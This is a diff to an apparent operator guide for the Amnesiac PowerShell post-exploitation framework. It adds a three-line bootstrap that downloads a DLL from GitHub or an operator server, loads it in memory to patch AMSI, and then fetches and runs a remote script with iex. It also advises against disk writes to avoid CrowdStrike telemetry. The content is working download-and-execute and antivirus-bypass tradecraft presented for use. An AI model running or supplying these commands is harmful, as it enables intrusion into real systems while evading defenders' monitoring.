@@ -71,17 +71,26 @@ runas /netonly /user:DOMAIN\username powershell.exe
    All tool loads via GitHub or operator HTTP server
 ```
 
-**Loading sequence (AMSI must be bypassed before the iex):**
+**Loading sequence — 3-liner bootstrap (preferred, strongest AMSI bypass):**
+
+`AmnesiacLoader.dll` bytes are loaded via `[Reflection.Assembly]::Load()` — AMSI does not scan raw bytes passed to `Assembly.Load`. The DLL's `Bypass` class patches AMSI via pure .NET reflection before the PS1 is downloaded. Names are randomized per build. Use `bootstrap` command to get exact current names.
+
 ```powershell
-# Step 1: AMSI bypass in current PS process (required — script is scanned on download)
-# <amsi-bypass-one-liner>
+# GitHub — no operator server needed (target needs outbound HTTPS to github.com):
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/<ns>.dll'))
+$_a.GetType('<ns>.<Bypass>').GetMethod('<PatchAmsiReflection>').Invoke($null,$null)
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 
-# Step 2a: load from operator's HTTP server (preferred if Scenario 1 box is on network)
-iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
+# Operator HTTP server — preferred when Scenario 1 box is on network (no GitHub egress needed):
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:8080/<ns>.dll'))
+$_a.GetType('<ns>.<Bypass>').GetMethod('<PatchAmsiReflection>').Invoke($null,$null)
+iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac
 
-# Step 2b: load directly from operator's fork on GitHub (assumed breach only — no operator box)
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1'); Amnesiac
+# PS-only fallback (weaker — paste a bypass one-liner from 'bootstrap' options [1]-[4] first):
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
+
+Run `bootstrap` in any local shell to get the exact 3-liner with the current build's randomized names pre-filled.
 
 **Key characteristics:**
 - `diskmode` MUST be OFF — any disk write triggers CrowdStrike file creation telemetry
